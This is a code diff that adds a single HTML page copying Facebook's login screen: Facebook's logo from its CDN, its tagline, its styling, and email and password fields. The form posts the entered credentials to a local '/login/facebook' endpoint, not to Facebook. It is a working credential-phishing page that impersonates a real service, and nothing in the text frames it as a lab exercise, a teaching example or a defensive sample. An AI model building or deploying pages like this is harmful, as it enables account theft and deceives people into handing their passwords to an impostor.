@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 90%;
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        .left-section {
+            flex: 1;
+            padding-right: 32px;
+        }
+        .right-section {
+            flex: 1;
+            max-width: 396px;
+        }
+        .facebook-logo {
+            width: 240px;
+            margin-bottom: 16px;
+        }
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            color: #1c1e21;
+        }
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+        .form-control:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account-btn {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+        .create-account-btn:hover {
+            background-color: #36a420;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            color: #737373;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 40px;
+            }
+            .tagline {
+                width: 100%;
+                font-size: 24px;
+            }
+            .facebook-logo {
+                margin: 0 auto 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="facebook-logo">
+            <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
+        </div>
+        
+        <div class="right-section">
+            <div class="login-form">
+                <form action="/login/facebook" method="POST">
+                    <input type="text" name="username" placeholder="Email address or phone number" class="form-control" required>
+                    <input type="password" name="password" placeholder="Password" class="form-control" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                
+                <div class="forgot-password">
+                    <a href="#">Forgotten password?</a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <button class="create-account-btn">Create New Account</button>
+            </div>
+            
+            <div class="footer">
+                <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
